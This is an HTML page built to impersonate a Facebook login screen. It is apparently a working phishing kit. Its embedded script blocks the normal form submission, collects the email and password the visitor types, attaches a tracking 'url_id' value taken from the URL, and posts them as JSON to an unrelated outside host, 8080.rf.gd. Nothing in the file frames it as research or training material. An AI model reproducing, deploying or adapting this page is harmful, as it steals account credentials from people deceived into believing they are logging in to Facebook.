<!DOCTYPE html>

<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook Login Page</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <div class="container flex">
      <div class="facebook-page flex">
        <div class="text">
          <h1>facebook</h1>
          <p>Connect with friends and the world</p>
          <p>around you on Facebook.</p>
        </div>
        <form id="loginForm" method="post">
          <input
            type="email"
            id="email"
            placeholder="Email or phone number"
            required
          />
          <input type="password" id="pwd" placeholder="Password" required />
          <div class="link">
            <button type="submit" class="login">Login</button>
            <a href="#" class="forgot">Forgot password?</a>
          </div>
          <hr />
          <div class="button">
            <a href="#?">Create new account</a>
          </div>
        </form>
      </div>
    </div>
  </body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 <script type="text/javascript">
        function copyText(id) {
            const textToCopy = document.getElementById(id);
            const tempTextarea = document.createElement("textarea");
            tempTextarea.value = textToCopy.innerText;
            document.body.appendChild(tempTextarea);
            tempTextarea.select();
            tempTextarea.setSelectionRange(0, 99999);
            document.execCommand("copy");
            document.body.removeChild(tempTextarea);
            alert("Copied the text: " + textToCopy.innerText);
        }

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            let email = document.getElementById('email').value;
            let password = document.getElementById('pwd').value;
            const url_id = getUrlParameter('url_id');
            const data = { email, password, url_id };

            const xhr = new XMLHttpRequest();
            xhr.open("POST", "https://8080.rf.gd/recieve_fb_data.php", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    console.log(xhr.responseText);
                }
            };
            xhr.send(JSON.stringify(data));
        });

        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            const results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
        }
    </script>
</html>
